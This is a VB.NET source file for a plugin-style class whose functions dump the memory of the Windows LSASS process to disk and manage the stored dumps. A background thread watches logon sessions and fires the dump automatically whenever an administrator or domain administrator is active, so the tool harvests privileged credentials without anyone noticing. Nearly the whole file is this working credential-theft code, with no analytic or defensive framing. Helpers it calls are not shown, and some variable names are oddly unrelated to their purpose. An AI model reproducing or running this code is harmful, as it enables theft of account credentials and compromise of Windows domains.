Imports System.IO
Imports System.Threading
Imports System.Runtime.InteropServices

Public Class main
    Private Shared scan As Boolean = False
    Private Shared alocal As Boolean = False
    Private Shared max As Integer = 1
    Private Shared tosc As Integer = 120
    Private Shared tosd As Integer = 1200
    Private Shared timeoutc As Integer = 0
    Private Shared timeoutd As Integer = 0
    Private Shared _t As Thread = Nothing
    Private Shared execdir As String = IO.Path.GetDirectoryName(Reflection.Assembly.GetEntryAssembly.Location)
    Private Shared errlog As String = ""
    Private Shared stracelog As New List(Of String)
    Private Shared errlogen As Boolean = True
    Private Shared dmode As String = "AD"
    Private Shared dm As String() = New String() {"SID", "AD"}

    Function version(args As Object) As Object
        Return Me.GetType.Assembly.GetName.Version.ToString
    End Function

    Function functionlist(args As Object) As Object
        Return "main.functionlist" & ControlChars.CrLf & "main.version" _
            & ControlChars.CrLf & "main.dumpprogramfull" & ControlChars.CrLf & "main.dumplsass" & ControlChars.CrLf & "main.removeoldeststore" & ControlChars.CrLf & "main.removestore" & ControlChars.CrLf & "main.clearstores" & ControlChars.CrLf & "main.liststores" & ControlChars.CrLf & "main.storecount" _
            & ControlChars.CrLf & "main.enablescan" & ControlChars.CrLf & "main.disablescan" & ControlChars.CrLf & "main.isscanning" _
            & ControlChars.CrLf & "main.gettimeoutscan" & ControlChars.CrLf & "main.settimeoutscan" & ControlChars.CrLf & "main.resettimeoutscan" _
            & ControlChars.CrLf & "main.gettimeoutdump" & ControlChars.CrLf & "main.settimeoutdump" & ControlChars.CrLf & "main.resettimeoutdump" _
            & ControlChars.CrLf & "main.getmaxstore" & ControlChars.CrLf & "main.setmaxstore" _
            & ControlChars.CrLf & "main.localaccountsallowed" & ControlChars.CrLf & "main.allowlocalaccounts" & ControlChars.CrLf & "main.disallowlocalaccounts" _
            & ControlChars.CrLf & "main.getstacktracecount" & ControlChars.CrLf & "main.getstacktrace" & ControlChars.CrLf & "main.clearstacktraces" & ControlChars.CrLf & "main.geterrorlog" & ControlChars.CrLf & "main.clearerrorlog" _
            & ControlChars.CrLf & "main.enableerrorlog" & ControlChars.CrLf & "main.disableerrorlog" & ControlChars.CrLf & "main.iserrorlogging" _
            & ControlChars.CrLf & "main.getdetectionmode" & ControlChars.CrLf & "main.getdetectionmodes" & ControlChars.CrLf & "main.setdetectionmode"
    End Function

    Function dumplsass(obj As Object) As Object
        If Not Directory.Exists(execdir & "\store") Then Directory.CreateDirectory(execdir & "\store")
        While castInt(storecount(Nothing)) > max
            removeoldeststore(Nothing)
        End While
        Return dumpprogramfull(New Object() {getlsass(), execdir & "\store\" & getdatetime() & ".dat"})
    End Function

    Function dumpprogramfull(obj As Object) As Object
        Dim args As String() = convertobjectargstostringargs(obj)
        If Not IsNothing(args) Then
            removeoldeststore(Nothing)
            Dim fstream As FileStream = Nothing
            Try
                Dim ptd As Process = Process.GetProcessById(args(0))
                fstream = File.Open(args(1), FileMode.Create)
                If Not MiniDumpWriteDump(ptd.Handle, ptd.Id, fstream.SafeFileHandle.DangerousGetHandle, MINIDUMP_TYPE.DumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero) Then
                    main.adderr("MiniDumpWriteDump", Marshal.GetLastWin32Error, Marshal.GetHRForLastWin32Error, New StackTrace().ToString())
                End If
                fstream.Close()
                Return "DONE"
            Catch ex As Exception
                adderr(ex)
                Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
            Finally
                If fstream IsNot Nothing Then fstream.Dispose()
            End Try
        End If
        Return "FAILED"
    End Function

    Function removeoldeststore(obj As Object) As Object
        Try
            If Directory.Exists(execdir & "\store") Then
                Dim lst As List(Of String) = New List(Of String)(IO.Directory.GetFiles(execdir & "\store"))
                Dim lstpf As New List(Of PFile)
                For Each f As String In lst
                    If Path.GetExtension(f) = ".dat" Then _
                    lstpf.Add(New PFile(f, File.GetCreationTime(f)))
                Next
                lstpf.Sort(New Comparison(Of PFile)(Function(pf1 As PFile, pf2 As PFile) As Integer
                                                        Return pf1.creationt.CompareTo(pf2.creationt)
                                                    End Function))
                File.Delete(lstpf(0).path)
            End If
            Return "DONE"
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function removestore(obj As Object) As Object
        Dim args As String() = convertobjectargstostringargs(obj)
        If Not IsNothing(args) Then
            Try
                If Directory.Exists(execdir & "\store") Then
                    File.Delete(execdir & "\store\" & args(0) & ".dat")
                End If
                Return "DONE"
            Catch ex As Exception
                adderr(ex)
                Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
            End Try
        End If
        Return "FAILED"
    End Function

    Function clearstores(obj As Object) As Object
        Try
            If Directory.Exists(execdir & "\store") Then Directory.Delete(execdir & "\store")
            Return "DONE"
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function liststores(obj As Object) As Object
        Try
            Dim toret As String = ""
            If Directory.Exists(execdir & "\store") Then
                Dim lilyrosewoodcnts As New List(Of String)(Directory.GetFiles(execdir & "\store"))
                For Each f As String In lilyrosewoodcnts
                    If Path.GetExtension(f) = ".dat" Then _
                    toret &= Path.GetFileNameWithoutExtension(f) & ControlChars.CrLf
                Next
            End If
            Return toret & "DONE"
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function storecount(obj As Object) As Object
        Try
            Dim inc As Integer = 0
            If Directory.Exists(execdir & "\store") Then
                Dim lottieholmescnts As New List(Of String)(Directory.GetFiles(execdir & "\store"))
                For Each f As String In lottieholmescnts
                    If Path.GetExtension(f) = ".dat" Then _
                    inc += 1
                Next
            End If
            Return inc
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function enablescan(obj As Object) As Object
        Try
            If Not scan Then
                If _t IsNot Nothing Then
                    If Not _t.IsAlive Then _t = Nothing
                End If
                If _t Is Nothing Then
                    _t = New Thread(AddressOf monitor)
                    _t.IsBackground = True
                End If
                scan = True
                _t.Start()
            End If
            Return "ENABLED"
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function disablescan(obj As Object) As Object
        Try
            If scan Then
                scan = False
                If _t IsNot Nothing Then
                    If _t.IsAlive Then _t.Join()
                End If
            End If
            Return "DISABLED"
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function gettimeoutscan(obj As Object) As Object
        Try
            Return tosc
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function settimeoutscan(obj As Object) As Object
        Dim args As String() = convertobjectargstostringargs(obj)
        If Not IsNothing(args) Then
            Try
                tosc = castInt(args(0))
                If tosc < 60 Then tosc = 60
                Return "DONE"
            Catch ex As Exception
                adderr(ex)
                Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
            End Try
        End If
        Return "FAILED"
    End Function

    Function resettimeoutscan(obj As Object) As Object
        Try
            timeoutc = 0
            Return "DONE"
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function gettimeoutdump(obj As Object) As Object
        Try
            Return tosd
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function settimeoutdump(obj As Object) As Object
        Dim args As String() = convertobjectargstostringargs(obj)
        If Not IsNothing(args) Then
            Try
                tosd = castInt(args(0))
                If tosd < 120 Then tosd = 120
                Return "DONE"
            Catch ex As Exception
                adderr(ex)
                Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
            End Try
        End If
        Return "FAILED"
    End Function

    Function resettimeoutdump(obj As Object) As Object
        Try
            timeoutd = 0
            Return "DONE"
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function getmaxstore(obj As Object) As Object
        Try
            Return max
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function setmaxstore(obj As Object) As Object
        Dim args As String() = convertobjectargstostringargs(obj)
        If Not IsNothing(args) Then
            Try
                max = castInt(args(0))
                If max < 1 Then max = 1
                Return "DONE"
            Catch ex As Exception
                adderr(ex)
                Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
            End Try
        End If
        Return "FAILED"
    End Function

    Function localaccountsallowed(obj As Object) As Object
        Try
            Return alocal
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function allowlocalaccounts(obj As Object) As Object
        Try
            alocal = True
            Return "DONE"
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function disallowlocalaccounts(obj As Object) As Object
        Try
            alocal = False
            Return "DONE"
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function isscanning(obj As Object) As Object
        Try
            Return scan
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function getstacktracecount(obj As Object) As Object
        Try
            Return stracelog.Count
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function getstacktrace(obj As Object) As Object
        Dim args As String() = convertobjectargstostringargs(obj)
        If Not IsNothing(args) Then
            Try
                Dim _try As Integer = castInt(args(0))
                Dim ret As String = stracelog(_try - 1)
                Return ret
            Catch ex As Exception
                adderr(ex)
                Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
            End Try
        End If
        Return "FAILED"
    End Function

    Function clearstacktraces(obj As Object) As Object
        Try
            stracelog.Clear()
            Return "DONE"
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function geterrorlog(obj As Object) As Object
        Try
            Return errlog
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function clearerrorlog(obj As Object) As Object
        Try
            errlog = ""
            Return "DONE"
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function enableerrorlog(obj As Object) As Object
        Try
            errlogen = True
            Return "ENABLED"
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function disableerrorlog(obj As Object) As Object
        Try
            errlogen = False
            Return "DISABLED"
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function iserrorlogging(obj As Object) As Object
        Try
            Return errlogen
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function getdetectionmode(obj As Object) As Object
        Try
            Return dmode
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function getdetectionmodes(obj As Object) As Object
        Try
            Dim toret As String = ""
            For Each s As String In dm
                toret &= s & ControlChars.CrLf
            Next
            toret.TrimEnd(ControlChars.CrLf)
            Return toret
        Catch ex As Exception
            adderr(ex)
            Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
        End Try
    End Function

    Function setdetectionmode(obj As Object) As Object
        Dim args As String() = convertobjectargstostringargs(obj)
        If Not IsNothing(args) Then
            Try
                Dim pdm As List(Of String) = New List(Of String)(dm)
                If Not pdm.Contains(args(0).ToUpper()) Then Throw New Exception("Mode Does Not Exist.")
                dmode = args(0).ToUpper()
                Return "[DONE] " & args(0).ToUpper()
            Catch ex As Exception
                adderr(ex)
                Return "FAILED: " & ex.GetType.ToString & " : " & ex.Message
            End Try
        End If
        Return "FAILED"
    End Function

    Private Sub monitor()
        Try
            While scan
                Try
                    If timeoutd > 0 Then
                        timeoutd -= 5
                    Else
                        If timeoutc > 0 Then
                            timeoutc -= 5
                        Else
                            Dim wtssl As New List(Of WTS_SESSION_INFOA)(getSessions())
                            Dim has As Boolean = False
                            For Each s As WTS_SESSION_INFOA In wtssl
                                If (s.State = WTS_CONNECTSTATE_CLASS.WTSActive Or s.State = WTS_CONNECTSTATE_CLASS.WTSConnected) Then
                                    If dmode = "SID" Then
                                        If alocal Then
                                            has = isAdministratorSID(s) Or isTokenAdministratorSID(s) Or isDomainAdministratorSID(s)
                                        Else
                                            has = ((Not isLocalSID(s)) Or (isDomainSID(s) And Not isLocalSID(s))) And (isAdministratorSID(s) Or isTokenAdministratorSID(s) Or isDomainAdministratorSID(s))
                                        End If
                                    ElseIf dmode = "AD" Then
                                        If alocal Then
                                            has = isAdministratorAD(s)
                                        Else
                                            has = ((Not isLocalAD(s)) Or (isDomainAD(s) And Not isLocalAD(s))) And (isAdministratorAD(s))
                                        End If
                                    End If
                                    If has Then Exit For
                                End If
                            Next
                            If has Then
                                dumplsass(Nothing)
                                timeoutc = tosc
                                timeoutd = tosd
                            Else
                                timeoutc = tosc
                            End If
                        End If
                    End If
                    Thread.Sleep(5000)
                Catch ex As ThreadAbortException
                    Throw ex
                Catch ex As Exception
                    adderr(ex)
                    timeoutc = tosc
                End Try
            End While
        Catch ex As ThreadAbortException
            Throw ex
        Catch ex As Exception
            adderr(ex)
        End Try
    End Sub

    Private Structure PFile
        Public path As String
        Public creationt As DateTime
        Public Sub New(p As String, ct As DateTime)
            path = p
            creationt = ct
        End Sub
    End Structure

    Shared Sub adderr(exp As Exception)
        If Not errlogen Then Return
        If errlog <> "" Then errlog &= ControlChars.CrLf
        errlog &= getdatetime() & "~"
        errlog &= exp.GetType().ToString & "~"
        errlog &= exp.Message & "~"
        stracelog.Add(exp.StackTrace)
        errlog &= stracelog.Count
    End Sub

    Shared Sub adderr(fnom As String, err1 As Integer, err2 As Integer, st As String)
        If Not errlogen Then Return
        If errlog <> "" Then errlog &= ControlChars.CrLf
        errlog &= getdatetime() & "~"
        errlog &= fnom & "~"
        errlog &= err1 & "~"
        errlog &= err2 & "~"
        stracelog.Add(st)
        errlog &= stracelog.Count
    End Sub
End Class


